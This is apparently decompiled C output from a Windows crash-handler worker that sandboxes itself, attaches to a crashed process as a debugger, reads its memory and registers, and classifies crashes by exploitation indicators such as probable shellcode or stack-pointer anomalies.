    pwVar1 = L"Excessive executable mappings found";
    break;
  case 3:
    pwVar1 = L"Crashing instruction modifies the stack pointer";
    break;
  case 4:
    pwVar1 = L"Crashing instructions are dereferences into a vtable";
    break;
  case 5:
    pwVar1 = L"Crash occurred near JMP, CALL, POP sequence";
    break;
  case 6:
    pwVar1 = L"Stack contained pointer to internal function";
    break;
  case 7:
    pwVar1 = L"Stack pointer outside stack segment";
    break;
  case 8:
    pwVar1 = L"Image mapping found which is not in module list";
    break;
  case 9:
    pwVar1 = L"Crash attempting to dereference common TIB address";
    break;
  case 10:
    pwVar1 = L"Executable mapping contained probable shellcode";
    break;
  default:
    pwVar1 = L"Unknown type";
  }
  FUN_00404cfa(param_1,(HMODULE)pwVar1);
  return param_1;
}



int FUN_0040bc1d(void)

{
  int iVar1;
  DWORD DVar2;
  HANDLE ProcessHandle;
  BOOL BVar3;
  undefined8 uVar4;
  DWORD DesiredAccess;
  HANDLE *TokenHandle;
  PSID local_14;
  undefined4 local_10;
  PSID local_c;
  HANDLE local_8;
  
  FUN_0040bcd5();
  uVar4 = FUN_00407d59();
  if ((char)uVar4 == '\0') {
    iVar1 = 0;
  }
  else {
    local_c = (PSID)0x0;
    iVar1 = ConvertStringSidToSidW(L"S-1-16-0",&local_c);
    if (iVar1 == 0) {
      iVar1 = -0x7fffbffb;
    }
    else {
      local_10 = 0x20;
      local_14 = local_c;
      DVar2 = GetLengthSid(local_c);
      local_8 = (HANDLE)0x0;
      TokenHandle = &local_8;
      DesiredAccess = 0xf01ff;
      ProcessHandle = GetCurrentProcess();
      OpenProcessToken(ProcessHandle,DesiredAccess,TokenHandle);
      BVar3 = SetTokenInformation(local_8,TokenIntegrityLevel,&local_14,DVar2 + 8);
      iVar1 = (-(uint)(BVar3 != 0) & 0x7fffbffb) + 0x80004005;
      if (local_8 != (HANDLE)0x0) {
        CloseHandle(local_8);
      }
    }
    if (local_c != (HLOCAL)0x0) {
      LocalFree(local_c);
    }
  }
  return iVar1;
}



undefined4 FUN_0040bcd5(void)

{
  HWINSTA hWinSta;
  HWINSTA hWinSta_00;
  DWORD dwThreadId;
  HDESK hDesktop;
  BOOL BVar1;
  HDESK hDesktop_00;
  undefined4 uVar2;
  
  uVar2 = 0;
  hWinSta = CreateWindowStationW((LPCWSTR)0x0,0,0x37f,(LPSECURITY_ATTRIBUTES)0x0);
  if (hWinSta != (HWINSTA)0x0) {
    hWinSta_00 = GetProcessWindowStation();
    dwThreadId = GetCurrentThreadId();
    hDesktop = GetThreadDesktop(dwThreadId);
    if ((hWinSta_00 == (HWINSTA)0x0) || (BVar1 = SetProcessWindowStation(hWinSta), BVar1 == 0)) {
      uVar2 = 0x80004005;
    }
    else {
      hDesktop_00 = CreateDesktopW(L"GoogleCrashHandlerWorkerDesktop",(LPCWSTR)0x0,(DEVMODEW *)0x0,0
                                   ,0x10000000,(LPSECURITY_ATTRIBUTES)0x0);
      if ((hDesktop_00 == (HDESK)0x0) || (BVar1 = SetThreadDesktop(hDesktop_00), BVar1 == 0)) {
        SetProcessWindowStation(hWinSta_00);
        uVar2 = 0x80004005;
      }
      if (hDesktop_00 != (HDESK)0x0) {
        CloseDesktop(hDesktop_00);
      }
    }
    if (hDesktop != (HDESK)0x0) {
      CloseDesktop(hDesktop);
    }
    if (hWinSta_00 != (HWINSTA)0x0) {
      CloseWindowStation(hWinSta_00);
    }
    CloseWindowStation(hWinSta);
    return uVar2;
  }
  return 0x80004005;
}



undefined4 FUN_0040bd94(void **param_1,int param_2,int param_3)

{
  uint *puVar1;
  void *this;
  undefined4 uVar2;
  int iVar3;
  int *piVar4;
  int **ppiVar5;
  int **ppiVar6;
  uint uVar7;
  uint extraout_EDX;
  
  if ((param_2 == 0) || (param_3 == 0)) {
    uVar2 = 0;
  }
  else {
    if ((DAT_00437b6b == '\0') && (*(int *)(param_2 + 8) == 4)) {
      DAT_00437b6b = '\x01';
      puVar1 = (uint *)param_1[2];
      this = *param_1;
      ppiVar6 = (int **)param_1[1];
      uVar7 = puVar1[1];
      iVar3 = FUN_0040bc1d();
      if ((-1 < iVar3) && (this != (void *)0x0)) {
        iVar3 = FUN_0040caf5((int)this);
        if (iVar3 != 0) {
          piVar4 = (int *)FUN_0040bb85(&param_3,iVar3);
          ppiVar5 = (int **)FUN_00407adc(&param_2,(HMODULE)"CrashAnalysisResult");
          ppiVar6 = FUN_0040ac0d(ppiVar6,extraout_EDX,ppiVar5);
          FUN_00401b2a(ppiVar6,piVar4);
          FUN_00401df0((int **)(param_2 + -0x10));
          FUN_00401df0((int **)(param_3 + -0x10));
          uVar7 = FUN_0040c5b7(this,uVar7);
          *puVar1 = uVar7;
        }
      }
    }
    uVar2 = 1;
  }
  return uVar2;
}



undefined8 __fastcall
FUN_0040be4e(undefined4 param_1,void *param_2,HMODULE param_3,HMODULE param_4,int param_5)

{
  undefined4 uVar1;
  bool bVar2;
  DWORD DVar3;
  HMODULE *_Memory;
  uint *_Memory_00;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  uint extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined8 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  HINSTANCE__ local_44;
  int local_40;
  undefined4 *local_3c;
  HINSTANCE__ local_38;
  uint *local_34;
  undefined4 local_30;
  undefined4 local_2c;
  uint local_28;
  void *local_24 [4];
  undefined4 local_14;
  undefined4 local_10;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_28 = 0;
  local_2c = 0;
  bVar2 = FUN_0040f488(param_2,&local_2c);
  if (bVar2 != false) {
    local_30 = 0;
    bVar2 = FUN_0040f4bc(param_2,&local_30);
    if (bVar2 != false) {
      uVar8 = 0x8c;
      uVar4 = FUN_00416f82(0x8c);
      local_3c = (undefined4 *)uVar4;
      if (local_3c == (undefined4 *)0x0) {
        _Memory = (HMODULE *)0x0;
      }
      else {
        uVar8 = *(undefined4 *)((int)param_2 + 4);
        uVar1 = *(undefined4 *)((int)param_2 + 0x24);
        local_14 = 0;
        uVar7 = *(undefined4 *)((int)param_2 + 8);
        local_28 = 1;
        uVar6 = *(undefined4 *)((int)param_2 + 0x10);
        local_10 = 7;
        local_24[0]._0_2_ = 0;
        uVar5 = local_2c;
        DVar3 = GetCurrentThreadId();
        _Memory = (HMODULE *)
                  FUN_00410647(local_3c,extraout_EDX,local_24,uVar1,uVar8,local_30,DVar3,uVar5,uVar6
                               ,uVar7);
        uVar4 = CONCAT44(extraout_EDX_00,local_3c);
        uVar8 = extraout_ECX;
      }
      local_3c = (undefined4 *)uVar4;
      if ((local_28 & 1) != 0) {
        FUN_0040ae40(local_24,'\x01',(void *)0x0);
        uVar4 = CONCAT44(extraout_EDX_01,local_3c);
        uVar8 = extraout_ECX_00;
      }
      local_3c = (undefined4 *)uVar4;
      _Memory[0x12] = param_3;
      _Memory[0x13] = param_4;
      _Memory_00 = (uint *)FUN_00423836(uVar8,(int)((ulonglong)uVar4 >> 0x20));
      FUN_00416e80(_Memory_00,0,0x4b0);
      local_38 = 100;
      _Memory[0x15] = &local_38;
      *(HMODULE *)(param_5 + 8) = &local_38;
      local_44 = (int)FUN_0040bd94;
      local_40 = param_5;
      _Memory[0x16] = &local_44;
      local_34 = _Memory_00;
      FUN_00410729(_Memory);
      FID_conflict__free(_Memory_00);
      FUN_004106c2(_Memory);
      FID_conflict__free(_Memory);
    }
  }
  uVar4 = FUN_0041a954();
  return uVar4;
}



undefined4 * __thiscall FUN_0040bf9f(void *this,byte param_1)

{
  FUN_0040e969((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0040bfbe(undefined4 *param_1)

{
  undefined4 *this;
  undefined4 *local_8;
  
  local_8 = param_1;
  local_8 = (undefined4 *)FUN_00416f82(8);
  if (local_8 == (undefined4 *)0x0) {
    local_8 = (undefined4 *)0x0;
  }
  else {
    local_8[1] = param_1;
    *local_8 = &PTR_FUN_00430f48;
  }
  this = param_1 + 10;
  FUN_0040ccae(this,&local_8);
  local_8 = (undefined4 *)FUN_00416f82(8);
  if (local_8 == (undefined4 *)0x0) {
    local_8 = (undefined4 *)0x0;
  }
  else {
    local_8[1] = param_1;
    *local_8 = &PTR_FUN_00430f40;
  }
  FUN_0040ccae(this,&local_8);
  local_8 = (undefined4 *)FUN_00416f82(8);
  if (local_8 == (undefined4 *)0x0) {
    local_8 = (undefined4 *)0x0;
  }
  else {
    local_8[1] = param_1;
    *local_8 = &PTR_FUN_00430f50;
  }
  FUN_0040ccae(this,&local_8);
  local_8 = (undefined4 *)FUN_00416f82(8);
  if (local_8 == (undefined4 *)0x0) {
    local_8 = (undefined4 *)0x0;
  }
  else {
    local_8[1] = param_1;
    *local_8 = &PTR_FUN_00430f58;
  }
  FUN_0040ccae(this,&local_8);
  local_8 = (undefined4 *)FUN_00416f82(8);
  if (local_8 == (undefined4 *)0x0) {
    local_8 = (undefined4 *)0x0;
  }
  else {
    local_8[1] = param_1;
    *local_8 = &PTR_FUN_00430f38;
  }
  FUN_0040ccae(this,&local_8);
  local_8 = (undefined4 *)FUN_00416f82(8);
  if (local_8 == (undefined4 *)0x0) {
    local_8 = (undefined4 *)0x0;
  }
  else {
    local_8[1] = param_1;
    *local_8 = &PTR_FUN_00430f60;
  }
  FUN_0040ccae(this,&local_8);
  return;
}



undefined4 * __thiscall FUN_0040c0c3(void *this,undefined4 param_1)

{
  code *pcVar1;
  int iVar2;
  DWORD DVar3;
  undefined4 *puVar4;
  undefined8 uVar5;
  undefined4 uVar6;
  
  *(undefined4 *)this = 0;
  *(undefined4 *)((int)this + 8) = 0;
  FUN_0040ce22((int *)((int)this + 0xc));
  FUN_0040ce60((int *)((int)this + 0x14));
  FUN_0040ce9e((int *)((int)this + 0x1c));
  *(undefined4 *)((int)this + 0x24) = param_1;
  *(undefined4 *)((int)this + 0x28) = 0;
  *(undefined4 *)((int)this + 0x2c) = 0;
  *(undefined4 *)((int)this + 0x30) = 0;
  uVar6 = 0x18;
  *(undefined4 *)((int)this + 0x34) = 0;
  *(undefined4 *)((int)this + 0x38) = 0;
  uVar5 = FUN_00416f82(0x18);
  iVar2 = (int)uVar5;
  if (iVar2 != 0) {
    *(int *)iVar2 = iVar2;
    if ((int *)(iVar2 + 4) != (int *)0x0) {
      *(int *)(iVar2 + 4) = iVar2;
    }
    if ((int *)(iVar2 + 8) != (int *)0x0) {
      *(int *)(iVar2 + 8) = iVar2;
    }
    *(undefined2 *)(iVar2 + 0xc) = 0x101;
    *(int *)((int)this + 0x34) = iVar2;
    *(undefined4 *)((int)this + 0x3c) = 0;
    *(undefined4 *)((int)this + 0x40) = 0;
    *(undefined4 *)((int)this + 0x44) = 0;
    *(undefined4 *)((int)this + 0x48) = 0;
    FUN_0040bfbe((undefined4 *)this);
    DVar3 = GetProcessId(*(HANDLE *)(*(int *)((int)this + 0x24) + 0x24));
    *(DWORD *)((int)this + 4) = DVar3;
    return (undefined4 *)this;
  }
  FUN_00422e78(uVar6,(int)((ulonglong)uVar5 >> 0x20));
  pcVar1 = (code *)swi(3);
  puVar4 = (undefined4 *)(*pcVar1)();
  return puVar4;
}



void __fastcall FUN_0040c15d(void **param_1)

{
  void *pvVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  uint uVar5;
  int *local_8;
  
  pvVar1 = *param_1;
  if (pvVar1 != (void *)0x0) {
    ContinueDebugEvent(*(DWORD *)((int)pvVar1 + 4),*(DWORD *)((int)pvVar1 + 8),0x10002);
    DebugActiveProcessStop((DWORD)param_1[1]);
  }
  iVar4 = 0;
  if (((int)param_1[0xb] - (int)param_1[10] & 0xfffffffcU) != 0) {
    do {
      puVar2 = *(undefined4 **)((int)param_1[10] + iVar4 * 4);
      if (puVar2 != (undefined4 *)0x0) {
        (**(code **)*puVar2)(1);
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 != (int)param_1[0xb] - (int)param_1[10] >> 2);
  }
  piVar3 = (int *)param_1[0xd];
  local_8 = (int *)*piVar3;
  if (local_8 != piVar3) {
    do {
      FID_conflict__free((void *)local_8[5]);
      FUN_00402ad4(&local_8);
    } while (local_8 != (int *)param_1[0xd]);
  }
                    // WARNING: Load size is inaccurate
  local_8 = *param_1[5];
  if (local_8 != (int *)param_1[5]) {
    do {
      CloseHandle((HANDLE)local_8[7]);
      FUN_00402ad4(&local_8);
    } while (local_8 != (int *)param_1[5]);
  }
  local_8 = (int *)0x0;
  if (((int)param_1[0x10] - (int)param_1[0xf]) / 0xc != 0) {
    uVar5 = 0;
    iVar4 = 0;
    do {
      FID_conflict__free(*(void **)(iVar4 + 8 + (int)param_1[0xf]));
      uVar5 = uVar5 + 1;
      iVar4 = iVar4 + 0xc;
    } while (uVar5 < (uint)(((int)param_1[0x10] - (int)param_1[0xf]) / 0xc));
  }
  if (param_1[0xf] != (void *)0x0) {
    FID_conflict__free(param_1[0xf]);
    param_1[0xf] = (void *)0x0;
    param_1[0x10] = (void *)0x0;
    param_1[0x11] = (void *)0x0;
  }
  FUN_0040cb35(param_1 + 0xd);
  if (param_1[10] != (void *)0x0) {
    FID_conflict__free(param_1[10]);
    param_1[10] = (void *)0x0;
    param_1[0xb] = (void *)0x0;
    param_1[0xc] = (void *)0x0;
  }
  FUN_0040cb35(param_1 + 7);
  FUN_0040cb35(param_1 + 5);
  FUN_0040cb35(param_1 + 3);
  FID_conflict__free(*param_1);
  return;
}



uint __thiscall FUN_0040c2b1(void *this,uint *param_1)

{
  uint uVar1;
  LPCVOID local_10;
  undefined4 local_c;
  LPCVOID local_8;
  
  local_8 = (LPCVOID)0x0;
  local_10 = (LPCVOID)0x0;
  local_c = 0;
  FUN_00416e80(param_1,0,8);
  uVar1 = ReadProcessMemory(*(HANDLE *)(*(int *)((int)this + 0x24) + 0x24),
                            *(LPCVOID *)(*(int *)((int)this + 0x24) + 0xc),&local_8,4,(SIZE_T *)0x0)
  ;
  if ((((uVar1 != 0) && (local_8 != (LPCVOID)0x0)) &&
      (uVar1 = ReadProcessMemory(*(HANDLE *)(*(int *)((int)this + 0x24) + 0x24),local_8,&local_10,8,
                                 (SIZE_T *)0x0), uVar1 != 0)) && (local_10 != (LPCVOID)0x0)) {
    uVar1 = ReadProcessMemory(*(HANDLE *)(*(int *)((int)this + 0x24) + 0x24),local_10,param_1,0x50,
                              (SIZE_T *)0x0);
    return uVar1 & 0xffffff00 | (uint)(uVar1 != 0);
  }
  return uVar1 & 0xffffff00;
}



undefined4 __thiscall FUN_0040c334(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  bool bVar6;
  
  puVar1 = *(undefined4 **)((int)this + 0x34);
  puVar2 = (undefined4 *)puVar1[1];
  puVar5 = puVar1;
  while (puVar3 = puVar2, *(char *)((int)puVar3 + 0xd) == '\0') {
    if ((undefined4 *)puVar3[4] < param_1) {
      puVar2 = (undefined4 *)puVar3[2];
    }
    else {
      puVar2 = (undefined4 *)*puVar3;
      puVar5 = puVar3;
    }
  }
  if ((puVar5 == puVar1) || (bVar6 = param_1 < (undefined4 *)puVar5[4], param_1 = puVar5, bVar6)) {
    param_1 = puVar1;
  }
  if (param_1 == *(undefined4 **)((int)this + 0x34)) {
    uVar4 = 0;
  }
  else {
    uVar4 = param_1[5];
  }
  return uVar4;
}



bool __thiscall FUN_0040c380(void *this,int *param_1,uint **param_2,uint *param_3)

{
  undefined4 *puVar1;
  uint nSize;
  undefined4 *puVar2;
  undefined4 *puVar3;
  uint *puVar4;
  uint *lpBuffer;
  BOOL BVar5;
  uint **ppuVar6;
  int extraout_EDX;
  bool bVar7;
  undefined4 *local_8;
  
  puVar1 = *(undefined4 **)((int)this + 0xc);
  puVar2 = (undefined4 *)puVar1[1];
  local_8 = puVar1;
  while (puVar3 = puVar2, *(char *)((int)puVar3 + 0xd) == '\0') {
    if ((int *)puVar3[4] < param_1) {
      puVar2 = (undefined4 *)puVar3[2];
    }
    else {
      puVar2 = (undefined4 *)*puVar3;
      local_8 = puVar3;
    }
  }
  if ((local_8 == puVar1) || (param_1 < (int *)local_8[4])) {
    local_8 = puVar1;
  }
  if (local_8 == puVar1) {
    bVar7 = false;
  }
  else {
    nSize = local_8[8];
    puVar4 = (uint *)FUN_0040c334(this,param_1);
    *param_2 = puVar4;
    if (puVar4 == (uint *)0x0) {
      lpBuffer = (uint *)FUN_00423836(param_2,extraout_EDX);
      FUN_00416e80(lpBuffer,0,nSize);
      BVar5 = ReadProcessMemory(*(HANDLE *)(*(int *)((int)this + 0x24) + 0x24),param_1,lpBuffer,
                                nSize,(SIZE_T *)0x0);
      bVar7 = BVar5 != 0;
      puVar4 = lpBuffer;
      if (bVar7) {
        *param_2 = lpBuffer;
        *param_3 = nSize;
        puVar4 = (uint *)0x0;
        ppuVar6 = (uint **)FUN_0040cd01((void *)((int)this + 0x34),&param_1);
        *ppuVar6 = lpBuffer;
      }
      FID_conflict__free(puVar4);
    }
    else {
      *param_3 = nSize;
      bVar7 = true;
    }
  }
  return bVar7;
}



uint __thiscall FUN_0040c445(void *this,uint param_1)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  LPVOID *ppvVar4;
  int *piVar5;
  _SYSTEM_INFO local_4c;
  int local_28 [7];
  int local_c;
  uint local_8;
  
  local_4c.u = 0;
  ppvVar4 = (LPVOID *)&local_4c.dwPageSize;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *ppvVar4 = (LPVOID)0x0;
    ppvVar4 = ppvVar4 + 1;
  }
  GetSystemInfo(&local_4c);
  uVar2 = ~(local_4c.dwPageSize - 1) & param_1;
  while( true ) {
    if (uVar2 == 0) goto LAB_0040c494;
    local_8 = uVar2;
    FUN_0040cb5e((void *)((int)this + 0xc),&local_c,&local_8);
    if (local_c != *(int *)((int)this + 0xc)) break;
    uVar2 = uVar2 - local_4c.dwPageSize;
  }
  piVar3 = (int *)(local_c + 0x14);
  piVar5 = local_28;
  for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {
    *piVar5 = *piVar3;
    piVar3 = piVar3 + 1;
    piVar5 = piVar5 + 1;
  }
  if (local_28[3] + uVar2 <= param_1) {
LAB_0040c494:
    uVar2 = 0;
  }
  return uVar2;
}



undefined4 __thiscall FUN_0040c4b8(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  bool bVar6;
  undefined4 local_2d4 [49];
  undefined4 local_210;
  
  puVar4 = *(undefined4 **)((int)this + 0x1c);
  puVar5 = (undefined4 *)puVar4[1];
  puVar3 = puVar4;
  while (puVar1 = puVar5, *(char *)((int)puVar1 + 0xd) == '\0') {
    if ((undefined4 *)puVar1[4] < param_1) {
      puVar5 = (undefined4 *)puVar1[2];
    }
    else {
      puVar5 = (undefined4 *)*puVar1;
      puVar3 = puVar1;
    }
  }
  if ((puVar3 == puVar4) || (bVar6 = param_1 < (undefined4 *)puVar3[4], param_1 = puVar3, bVar6)) {
    param_1 = puVar4;
  }
  if (param_1 == puVar4) {
    local_210 = 0;
  }
  else {
    puVar4 = param_1 + 5;
    puVar5 = local_2d4;
    for (iVar2 = 0xb4; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar5 = *puVar4;
      puVar4 = puVar4 + 1;
      puVar5 = puVar5 + 1;
    }
  }
  return local_210;
}



void __fastcall FUN_0040c51e(int param_1,int param_2,void **param_3)

{
  size_t _Size;
  int iVar1;
  size_t *psVar2;
  size_t *psVar3;
  size_t local_10 [2];
  void *local_8;
  
  local_8 = (void *)0x0;
  local_10[0] = 10;
  _Size = *(size_t *)((int)*param_3 + -0xc);
  local_10[1] = _Size;
  local_8 = (void *)FUN_00423836(param_1,param_2);
  FID_conflict__memcpy(local_8,*param_3,_Size);
  psVar3 = *(size_t **)(param_1 + 0x40);
  if ((local_10 < psVar3) &&
     (*(size_t **)(param_1 + 0x3c) < local_10 || *(size_t **)(param_1 + 0x3c) == local_10)) {
    iVar1 = *(int *)(param_1 + 0x3c);
    if (psVar3 == *(size_t **)(param_1 + 0x44)) {
      FUN_0040cdb7((void **)(param_1 + 0x3c));
    }
    psVar3 = *(size_t **)(param_1 + 0x40);
    psVar2 = (size_t *)((((int)local_10 - iVar1) / 0xc) * 0xc + *(int *)(param_1 + 0x3c));
    if (psVar3 == (size_t *)0x0) goto LAB_0040c5aa;
  }
  else {
    if (psVar3 == *(size_t **)(param_1 + 0x44)) {
      FUN_0040cdb7((void **)(param_1 + 0x3c));
    }
    psVar3 = *(size_t **)(param_1 + 0x40);
    if (psVar3 == (size_t *)0x0) goto LAB_0040c5aa;
    psVar2 = local_10;
  }
  *psVar3 = *psVar2;
  psVar3[1] = psVar2[1];
  psVar3[2] = psVar2[2];
LAB_0040c5aa:
  *(int *)(param_1 + 0x40) = *(int *)(param_1 + 0x40) + 0xc;
  return;
}



uint __thiscall FUN_0040c5b7(void *this,int param_1)

{
  uint uVar1;
  int iVar2;
  uint *puVar3;
  uint local_c;
  uint local_8;
  
  local_8 = 100;
  if (param_1 == 0) {
    uVar1 = 0;
  }
  else {
    local_c = (*(int *)((int)this + 0x40) - *(int *)((int)this + 0x3c)) / 0xc;
    puVar3 = &local_8;
    if (local_c < 0x65) {
      puVar3 = &local_c;
    }
    if (*puVar3 != 0) {
      uVar1 = *puVar3;
      iVar2 = 0;
      do {
        FID_conflict__memcpy
                  ((void *)(iVar2 + param_1),(void *)(*(int *)((int)this + 0x3c) + iVar2),0xc);
        iVar2 = iVar2 + 0xc;
        uVar1 = uVar1 - 1;
      } while (uVar1 != 0);
    }
    uVar1 = *puVar3;
  }
  return uVar1;
}



// WARNING: Could not reconcile some variable overlaps

undefined8 __fastcall FUN_0040c624(int param_1)

{
  BOOL BVar1;
  uint uVar2;
  uint uVar3;
  int **ppiVar4;
  SIZE_T SVar5;
  int iVar6;
  HANDLE pvVar7;
  CONTEXT *pCVar8;
  HANDLE hProcess;
  PVOID *ppvVar9;
  undefined8 uVar10;
  _MEMORY_BASIC_INFORMATION local_374;
  DWORD local_358;
  int *local_354;
  int *local_350;
  int *local_34c;
  undefined4 local_348;
  HANDLE local_344;
  int *local_340;
  CONTEXT local_33c;
  HANDLE local_70;
  undefined local_6c [16];
  HANDLE local_5c;
  HANDLE local_58;
  int *local_54;
  int *local_48;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  BVar1 = DebugActiveProcess(*(DWORD *)(param_1 + 4));
  if (BVar1 != 0) {
    pvVar7 = (HANDLE)0x0;
    local_6c._0_4_ = 0;
    FUN_00416e80((uint *)(local_6c + 4),0,0x5c);
    uVar2 = GetTickCount();
    local_358 = uVar2;
    do {
      BVar1 = WaitForDebugEvent((LPDEBUG_EVENT)local_6c,0);
      hProcess = local_5c;
      if (BVar1 != 0) {
        if (local_6c._0_4_ == 3) {
          local_344 = local_5c;
          if (local_5c != (HANDLE)0x0) {
            FUN_00416e80(&local_33c.Dr0,0,0x2cc);
            local_33c.ContextFlags = 0x10007;
            local_70 = local_58;
            BVar1 = GetThreadContext(local_58,&local_33c);
            if (BVar1 != 0) {
              local_340 = local_48;
              ppiVar4 = FUN_0040cc24((void *)(param_1 + 0x1c),&local_340);
              pCVar8 = &local_33c;
              for (iVar6 = 0xb4; hProcess = local_344, iVar6 != 0; iVar6 = iVar6 + -1) {
                *ppiVar4 = (int *)pCVar8->ContextFlags;
                pCVar8 = (CONTEXT *)&pCVar8->Dr0;
                ppiVar4 = ppiVar4 + 1;
              }
            }
            local_354 = (int *)0x0;
            local_374.BaseAddress = (PVOID)0x0;
            local_350 = (int *)0x0;
            local_34c = (int *)0x0;
            local_348 = (int *)0x0;
            ppvVar9 = &local_374.AllocationBase;
            for (iVar6 = 6; iVar6 != 0; iVar6 = iVar6 + -1) {
              *ppvVar9 = (PVOID)0x0;
              ppvVar9 = ppvVar9 + 1;
            }
            SVar5 = VirtualQueryEx(hProcess,local_354,&local_374,0x1c);
            pvVar7 = hProcess;
            if (SVar5 == 0x1c) {
              local_350 = (int *)local_374.RegionSize;
              local_34c = local_6c._12_4_;
              local_354 = local_54;
              local_340 = local_54;
              local_348 = (int *)CONCAT31(local_348._1_3_,1);
              ppiVar4 = FUN_0040cbaa((void *)(param_1 + 0x14),&local_340);
              *ppiVar4 = local_354;
              ppiVar4[1] = local_350;
              ppiVar4[2] = local_34c;
              ppiVar4[3] = local_348;
              pvVar7 = local_344;
            }
            ContinueDebugEvent(local_6c._4_4_,local_6c._8_4_,0x10002);
            uVar2 = local_358;
            goto LAB_0040c7cb;
          }
        }
LAB_0040c692:
        DebugActiveProcessStop(*(DWORD *)(param_1 + 4));
        break;
      }
      Sleep(0x32);
      uVar3 = FUN_00402593(uVar2);
      if ((char)uVar3 != '\0') goto LAB_0040c692;
LAB_0040c7cb:
    } while (pvVar7 == (HANDLE)0x0);
  }
  uVar10 = FUN_0041a954();
  return uVar10;
}



void __thiscall FUN_0040c7da(void *this,HANDLE param_1)

{
  int **ppiVar1;
  SIZE_T SVar2;
  int iVar3;
  void *pvVar4;
  int **ppiVar5;
  int **ppiVar6;
  LPVOID *ppvVar7;
  undefined4 *puVar8;
  int **ppiVar9;
  LPCVOID lpAddress;
  _SYSTEM_INFO local_50;
  undefined local_2c [28];
  int **local_10;
  int *local_c;
  void *local_8;
  
  local_50.u = 0;
  ppvVar7 = (LPVOID *)&local_50.dwPageSize;
  for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppvVar7 = (LPVOID)0x0;
    ppvVar7 = ppvVar7 + 1;
  }
  local_8 = this;
  GetSystemInfo(&local_50);
  local_2c._0_4_ = (int *)0x0;
  puVar8 = (undefined4 *)(local_2c + 4);
  for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined4 *)((int)this + 8) = 0;
  lpAddress = (LPCVOID)0x0;
  while (SVar2 = VirtualQueryEx(param_1,lpAddress,(PMEMORY_BASIC_INFORMATION)local_2c,0x1c),
        SVar2 == 0x1c) {
    pvVar4 = this;
    if (local_2c._16_4_ == 0x1000) {
      ppiVar6 = *(int ***)((int)this + 0xc);
      local_c = local_2c._0_4_;
      ppiVar1 = (int **)ppiVar6[1];
      ppiVar5 = ppiVar6;
      while (ppiVar9 = ppiVar1, *(char *)((int)ppiVar9 + 0xd) == '\0') {
        if (ppiVar9[4] < local_2c._0_4_) {
          ppiVar1 = (int **)ppiVar9[2];
        }
        else {
          ppiVar1 = (int **)*ppiVar9;
          ppiVar5 = ppiVar9;
        }
      }
      if ((ppiVar5 == ppiVar6) || (pvVar4 = local_8, local_2c._0_4_ < ppiVar5[4])) {
        ppiVar1 = (int **)FUN_0040d48a((undefined4 *)((int)this + 0xc));
        pvVar4 = local_8;
        ppiVar6 = ppiVar1 + 4;
        *(undefined2 *)(ppiVar1 + 3) = 0;
        if (ppiVar6 != (int **)0x0) {
          *ppiVar6 = local_c;
          ppiVar9 = ppiVar1 + 5;
          for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
            *ppiVar9 = (int *)0x0;
            ppiVar9 = ppiVar9 + 1;
          }
        }
        FUN_0040d08a((void *)((int)local_8 + 0xc),(int **)&local_10,ppiVar5,ppiVar6,ppiVar1);
        ppiVar5 = local_10;
      }
      ppiVar6 = (int **)local_2c;
      ppiVar1 = ppiVar5 + 5;
      for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
        *ppiVar1 = *ppiVar6;
        ppiVar6 = ppiVar6 + 1;
        ppiVar1 = ppiVar1 + 1;
      }
      if ((local_2c[20] & 0x70) != 0) {
        *(int *)((int)pvVar4 + 8) =
             *(int *)((int)pvVar4 + 8) + local_2c._12_4_ / local_50.dwPageSize;
      }
    }
    lpAddress = (LPCVOID)((int)local_2c._0_4_ + local_2c._12_4_);
    this = pvVar4;
  }
  return;
}



undefined8 __fastcall FUN_0040c8e2(void **param_1)

{
  undefined4 *puVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  undefined4 *puVar5;
  uint uVar6;
  BOOL BVar7;
  uint uVar8;
  undefined4 *puVar9;
  undefined4 **ppuVar10;
  int **ppiVar11;
  void *pvVar12;
  undefined4 *puVar13;
  int iVar14;
  CONTEXT *pCVar15;
  undefined8 uVar16;
  undefined4 *local_354;
  undefined4 *local_350;
  int *local_34c;
  int *local_348;
  DWORD local_344;
  char local_33d;
  CONTEXT local_33c;
  int *local_70;
  undefined local_6c [16];
  int *local_5c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  uVar6 = GetTickCount();
  local_6c._0_4_ = 0;
  local_344 = uVar6;
  FUN_00416e80((uint *)(local_6c + 4),0,0x5c);
  local_33d = '\0';
  do {
    BVar7 = WaitForDebugEvent((LPDEBUG_EVENT)local_6c,0);
    if (BVar7 == 0) {
      Sleep(0x32);
      uVar8 = FUN_00402593(uVar6);
      if ((char)uVar8 != '\0') {
        DebugActiveProcessStop((DWORD)param_1[1]);
        goto LAB_0040ca85;
      }
    }
    else {
      local_33c.ContextFlags = 0;
      FUN_00416e80(&local_33c.Dr0,0,0x2cc);
      piVar4 = local_5c;
      piVar3 = local_6c._12_4_;
      if (local_6c._0_4_ == 1) {
        local_33d = '\x01';
      }
      else if (local_6c._0_4_ == 2) {
        local_33c.ContextFlags = 0x10007;
        local_70 = local_6c._12_4_;
